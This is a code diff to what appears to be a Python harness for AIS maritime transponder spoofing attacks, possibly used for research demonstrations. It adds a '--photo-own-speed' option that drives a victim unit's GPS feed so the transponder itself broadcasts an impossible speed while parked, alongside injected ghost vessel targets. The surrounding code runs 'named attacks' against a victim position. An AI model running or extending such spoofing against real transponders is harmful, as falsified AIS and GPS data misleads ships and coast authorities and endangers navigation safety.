@@ -1120,6 +1120,11 @@ def main():
                     help="override the ghost target latitude for a photo (e.g. an on-land point)")
     ap.add_argument("--photo-lon", type=float, default=None,
                     help="override the ghost target longitude for a photo")
+    ap.add_argument("--photo-own-speed", type=float, default=None,
+                    help="drive the UNIT'S OWN reported speed via its GPS feed to this many knots, so "
+                         "the transponder itself reports an impossible speed while parked. Max useful "
+                         "~102.2 kn (AIS SOG saturates there). Combine with --photo impossible_speed "
+                         "to put both a ghost and the own ship at impossible speed in one frame.")
     ap.add_argument("--only", nargs="+", help="run only these named attacks")
     ap.add_argument("--skip", nargs="+", default=[])
     ap.add_argument("--logdir", default=os.path.expanduser("~/ais_tx"))
@@ -1229,6 +1234,11 @@ def main():
             photos = build_photos(ctx, args.photo_lat, args.photo_lon)
             kind, payloads, banner = photos[args.photo]
             rec(event="photo_start", name=args.photo, kind=kind)
+            if args.photo_own_speed is not None:
+                gps.set_position(ctx.victim_lat, ctx.victim_lon, speed=args.photo_own_speed)
+                rec(event="photo_own_speed", speed=args.photo_own_speed)
+                print(f"  own-ship GPS feed set to {args.photo_own_speed} kn -- the unit itself now "
+                      f"reports impossible speed while parked")
             def _send_all():
                 for bits, meta in payloads:
                     if all(c in "01" for c in bits):
